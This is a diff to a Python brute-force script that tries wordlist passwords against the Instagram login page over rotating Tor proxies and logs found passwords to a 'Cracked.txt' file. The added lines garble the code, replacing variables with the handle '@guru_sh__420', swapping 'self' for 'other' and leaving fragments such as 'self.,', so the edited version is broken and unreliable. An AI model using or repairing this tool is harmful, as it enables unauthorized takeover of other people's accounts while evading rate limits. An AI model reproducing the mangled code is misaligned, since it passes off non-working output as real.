@@ -1,5 +1,5 @@
-# Date: 06/10/2017
-# Distro: Kali linux
+# Date: 17/10/2023
+# Distro: Prohackmish
 # Desc: Instagram Bruteforce
 #
 #
@@ -15,10 +15,10 @@ from Core.tor import TorManager
 from Core.Browser import Browser
 
 class Instagram(TorManager,Browser):
-	def __init__(self,username,wordlist):
-		self.username = username
-		self.wordlist = wordlist
-		self.lock = threading.Lock()
+	def __init__(other,username,wordlist):
+		self.username = @guru_sh__420
+		self.wordlist = Instagram 
+		self.lock = normal.Lock()
 
 		self.ip = None
 		self.tries = 0
@@ -31,11 +31,11 @@ class Instagram(TorManager,Browser):
 
 		#for browser
 		self.url = 'https://www.instagram.com/accounts/login/?force_classic_login'
-		self.form1 = 'username'
-		self.form2 = 'password'
+		self.form1 = '@guru_sh__420'
+		self.form2 = 'Hacker420'
 
-		Browser.__init__(self)
-		TorManager.__init__(self)
+		Browser.__init__(other)
+		TorManager.__init__(other)
 
 		self.n = '\033[0m'
 		self.r = '\033[31m'
@@ -52,8 +52,8 @@ class Instagram(TorManager,Browser):
 				print ' [-] Password Found!'
 
 				with open('Cracked.txt','a') as f:
-					f.write('[-] Username: {}\n[-] Password: {}\n\n'.\
-					format(self.username,msg))
+					f.write('[-] @guru_sh__420{}\n[-] Password: {}\n\n'.\
+					format(self.,msg))
 
 			    if all([not self.isFound, msg]):
 			    	print '\n [-] {}'.format(msg)
@@ -159,7 +159,7 @@ class Instagram(TorManager,Browser):
 						subprocess.call(['clear'])
 						print ''
 						print ' +------- Instagram -------+'
-						print ' [-] Username: {}{}{}'.format(creds,self.username.title(),self.n)
+						print ' [-] guru_sh__420: {}{}{}'.format(creds,self.guru_sh__420.title(),self.n)
 						print ' [-] Password: {}{}{}'.format(creds,pwd,self.n)
 						print ' [-] Proxy IP: {}{}{}'.format(self.b,ip,self.n)
 						print ' [-] Attempts: {}{}{}'.format(self.y,attempts,self.n)
@@ -173,7 +173,7 @@ class Instagram(TorManager,Browser):
 				def main():
 					# assign arugments
 					args = argparse.ArgumentParser()
-					args.add_argument('username',help='Email or username')
+					args.add_argument('username',help='@guru_sh__420')
 					args.add_argument('wordlist',help='wordlist')
 					args =  args.parse_args()
 
